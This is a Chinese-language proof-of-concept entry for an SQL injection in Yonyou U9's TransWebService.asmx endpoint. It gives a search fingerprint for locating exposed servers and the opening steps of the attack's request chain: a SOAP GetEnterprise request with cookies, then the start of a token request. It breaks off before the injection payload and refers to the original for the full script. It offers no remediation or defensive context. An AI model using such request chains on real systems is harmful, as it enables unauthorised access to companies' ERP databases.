# 用友U9DoQuerySQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="logo-u9.png"`
- **请求**：`POST /CS/Office/TransWebService.asmx HTTP/1.1`

**请求体 / payload**
```
步骤1：获取code
Cookie: .ASPXANONYMOUS=1trTf5ff2gEkAAAAMzU0N2I3ZjctYzg0OC00YWFmLTliZTEtNDI2NDc1YmYyMTc10; ASP.NET_SessionId=ntvjalpizrae22kebxy5tn0g
Priority: u=1
SOAPAction: [http://tempuri.org/GetEnterprise](http://tempuri.org/GetEnterprise)
Content-Type: text/xml;charset=UTF-8
Host:
Content-Length: 193
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
<soap:Header/>
<soap:Body>
<tem:GetEnterprise/>
</soap:Body>
</soap:Envelope>
步骤2：获取token
POST /CS/Office/TransWebService.asmx HTTP/1.1
Cookie: .ASPXANONYMOUS=1trTf5ff2gEkAAAAMzU0N2I3ZjctYzg0OC00YW…（脚本共 1795 字，完整版见原文）
```